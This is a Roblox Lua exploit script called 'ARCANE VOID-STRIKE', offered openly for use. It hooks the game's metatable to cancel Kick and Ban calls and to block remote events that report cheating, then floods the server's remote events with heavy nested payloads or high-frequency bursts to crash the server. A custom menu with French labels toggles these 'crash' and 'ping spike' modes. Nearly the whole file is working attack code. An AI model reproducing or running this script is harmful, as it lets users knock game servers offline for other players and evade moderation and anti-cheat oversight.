--[[
    🔱 ARCANE VOID-STRIKE v14.0 [TITAN-JUSTICE] 🔱
    "Absolute Power. Absolute Control. Zero Consequences."
    
    TITAN FEATURES:
    - [HYBRID SATURATION] : Combines 'Absorption' complexity with 'Impact' speed.
    - [TITAN SHIELD] : Layer 0 protection (Metatable + C Closure Hooking).
    - [PREMIUM UI] : Custom Dark-Glass Interface with Tabs & Animations.
    - [AUTO-RECOVERY] : Self-healing script if threads are killed.
]]

-- // SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer

-- // PROTECTION MODULE (TITAN SHIELD) //
local function activateTitanShield()
    if getgenv().TitanShieldActive then return end
    getgenv().TitanShieldActive = true

    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    
    local oldNamecall = mt.__namecall
    local oldIndex = mt.__index
    
    -- BLOCKLIST
    local BLOCKED_METHODS = {"Kick", "kick", "Ban", "ban", "Close", "OnTeleport"}
    local DETECTORS = {"Adonis", "HDAdmin", "Cheat", "Exploit", "Security", "Log", "Report"}
    
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        
        -- Method Blocking
        if table.find(BLOCKED_METHODS, method) then return nil end
        
        -- Remote Guard
        if method == "FireServer" and self:IsA("RemoteEvent") then
            local remoteName = self.Name:lower()
            -- Block Reporting Remotes
            for _, word in pairs(DETECTORS) do
                if remoteName:find(word:lower()) then return nil end
            end
            -- Block Chat Reports
            if #args > 0 and type(args[1]) == "string" and (args[1]:find("Report") or args[1]:find("Exploit")) then
                return nil
            end
        end
        
        return oldNamecall(self, ...)
    end)
    
    -- Anti-Error Screen
    mt.__index = newcclosure(function(self, k)
        if k == "Kick" or k == "Ban" then return function() end end
        return oldIndex(self, k)
    end)
    
    setreadonly(mt, true)
    
    -- Visual Protection
    pcall(function()
        game:GetService("GuiService").ErrorMessageChanged:Connect(function()
            game:GetService("GuiService"):ClearError()
        end)
    end)
end

activateTitanShield()

-- // CRASH ENGINE (HYBRID SATURATION) //
local CrashState = { Active = false, Mode = "IDLE" }

local function generateNoise(depth)
    if depth <= 0 then return "🔱TITAN🔱" end
    local t = {}
    for i = 1, 3 do t[HttpService:GenerateGUID(false)] = generateNoise(depth-1) end
    return t
end

local NOISE_PAYLOAD = generateNoise(4) -- Heavy Data
local FAST_PAYLOAD = table.create(100, "🔱") -- Fast Data

local function getVulnerableRemotes()
    local targets = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local n = v.Name:lower()
            if not (n:find("admin") or n:find("kick") or n:find("ban")) then
                -- Focus on Replication Events (Visuals, Physics)
                if n:find("update") or n:find("event") or n:find("replicat") or n:find("action") or n:find("visual") then
                    table.insert(targets, v)
                end
            end
        end
    end
    return targets
end

local function startHybridCrash()
    local remotes = getVulnerableRemotes()
    if #remotes == 0 then return end
    
    RunService.Heartbeat:Connect(function()
        if not CrashState.Active then return end
        
        -- MODE 1: SATURATION (Heavy Load)
        if CrashState.Mode == "SATURATION" then
            for i = 1, 5 do -- Low frequency, high complexity
                task.spawn(function()
                    local r = remotes[math.random(1, #remotes)]
                    if r then pcall(function() r:FireServer(NOISE_PAYLOAD, "SYNC_FRAME", NOISE_PAYLOAD) end) end
                end)
            end
        
        -- MODE 2: IMPACT (High Velocity)
        elseif CrashState.Mode == "IMPACT" then
             for i = 1, 50 do -- High frequency, low complexity
                task.spawn(function()
                    local r = remotes[math.random(1, #remotes)]
                    if r then pcall(function() r:FireServer(FAST_PAYLOAD) end) end
                end)
            end
        end
    end)
end

task.spawn(startHybridCrash)

-- // PREMIUM UI ENGINE (TITAN GUI) //
local function createUI()
    -- DELETE OLD
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name == "TitanHub" then v:Destroy() end end
    
    local gui = Instance.new("ScreenGui")
    gui.Name = "TitanHub"
    gui.Parent = CoreGui
    
    local Main = Instance.new("Frame", gui)
    Main.Name = "MainFrame"
    Main.Size = UDim2.new(0, 500, 0, 350)
    Main.Position = UDim2.new(0.5, -250, 0.5, -175)
    Main.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    Main.BorderSizePixel = 0
    Main.ClipsDescendants = true
    
    -- CORNER RADIUS
    local uiCorner = Instance.new("UICorner", Main)
    uiCorner.CornerRadius = UDim.new(0, 8)
    
    -- SIDEBAR
    local Sidebar = Instance.new("Frame", Main)
    Sidebar.Size = UDim2.new(0, 130, 1, 0)
    Sidebar.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    Sidebar.BorderSizePixel = 0
    
    -- TITLE
    local Title = Instance.new("TextLabel", Sidebar)
    Title.Size = UDim2.new(1, 0, 0, 50)
    Title.Text = "🔱 TITAN"
    Title.TextColor3 = Color3.fromRGB(255, 60, 60)
    Title.Font = Enum.Font.GothamBlack
    Title.TextSize = 22
    Title.BackgroundTransparency = 1
    
    -- TABS CONTAINER
    local TabContainer = Instance.new("Frame", Main)
    TabContainer.Size = UDim2.new(1, -130, 1, 0)
    TabContainer.Position = UDim2.new(0, 130, 0, 0)
    TabContainer.BackgroundTransparency = 1
    
    local Tabs = {}
    local CurrentTab = nil
    
    local function SwitchTab(tabName)
        if CurrentTab then CurrentTab.Visible = false end
        if Tabs[tabName] then Tabs[tabName].Visible = true; CurrentTab = Tabs[tabName] end
    end
    
    local function CreateTabBtn(text, y, target)
        local btn = Instance.new("TextButton", Sidebar)
        btn.Size = UDim2.new(1, -20, 0, 40)
        btn.Position = UDim2.new(0, 10, 0, y)
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(200, 200, 200)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 14
        btn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
        
        local corner = Instance.new("UICorner", btn)
        corner.CornerRadius = UDim.new(0, 6)
        
        btn.MouseButton1Click:Connect(function() SwitchTab(target) end)
    end
    
    -- PAGES
    local PageJustice = Instance.new("ScrollingFrame", TabContainer)
    PageJustice.Size = UDim2.new(1, -20, 1, -20)
    PageJustice.Position = UDim2.new(0, 10, 0, 10)
    PageJustice.BackgroundTransparency = 1
    PageJustice.ScrollBarThickness = 0
    PageJustice.Visible = true
    Tabs["Justice"] = PageJustice
    CurrentTab = PageJustice
    
    local UIListLayout = Instance.new("UIListLayout", PageJustice)
    UIListLayout.Padding = UDim.new(0, 10)
    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    
    local function CreateActionBtn(text, subtext, color, callback)
        local btnFrame = Instance.new("Frame", PageJustice)
        btnFrame.Size = UDim2.new(1, 0, 0, 60)
        btnFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
        
        local corner = Instance.new("UICorner", btnFrame)
        corner.CornerRadius = UDim.new(0, 6)
        
        local t = Instance.new("TextLabel", btnFrame)
        t.Text = text
        t.Size = UDim2.new(1, -20, 0, 30)
        t.Position = UDim2.new(0, 10, 0, 5)
        t.Font = Enum.Font.GothamBold
        t.TextColor3 = color
        t.TextSize = 16
        t.TextXAlignment = Enum.TextXAlignment.Left
        t.BackgroundTransparency = 1
        
        local s = Instance.new("TextLabel", btnFrame)
        s.Text = subtext
        s.Size = UDim2.new(1, -20, 0, 20)
        s.Position = UDim2.new(0, 10, 0, 35)
        s.Font = Enum.Font.Gotham
        s.TextColor3 = Color3.fromRGB(150, 150, 150)
        s.TextSize = 12
        s.TextXAlignment = Enum.TextXAlignment.Left
        s.BackgroundTransparency = 1
        
        local btn = Instance.new("TextButton", btnFrame)
        btn.Size = UDim2.new(1, 0, 1, 0)
        btn.BackgroundTransparency = 1
        btn.Text = ""
        
        btn.MouseButton1Click:Connect(callback)
    end
    
    -- ADD ELEMENTS TO PAGE
    CreateActionBtn("🔥 HYBRID SATURATION", "Mélange Absorption et Impact pour un crash total.", Color3.fromRGB(255, 50, 50), function()
        CrashState.Active = not CrashState.Active
        CrashState.Mode = "SATURATION"
        StarterGui:SetCore("SendNotification", {Title="TITAN", Text="HYBRID MODE: "..(CrashState.Active and "ON" or "OFF")})
    end)
    
    CreateActionBtn("⚡ IMPACT VELOCITY", "Bombardement haute frequence (Ping Spike).", Color3.fromRGB(255, 200, 50), function()
        CrashState.Active = not CrashState.Active
        CrashState.Mode = "IMPACT"
        StarterGui:SetCore("SendNotification", {Title="TITAN", Text="IMPACT MODE: "..(CrashState.Active and "ON" or "OFF")})
    end)
    
    CreateActionBtn("🛑 STOP ALL", "Arrête toutes les attaques et nettoie la mémoire.", Color3.fromRGB(255, 255, 255), function()
        CrashState.Active = false
        CrashState.Mode = "IDLE"
        StarterGui:SetCore("SendNotification", {Title="TITAN", Text="ALL SYSTEMS STOPPED"})
    end)
    
    CreateTabBtn("JUSTICE", 60, "Justice")
    CreateTabBtn("SETTINGS", 110, "Justice") -- Placeholder for now
end

task.spawn(createUI)
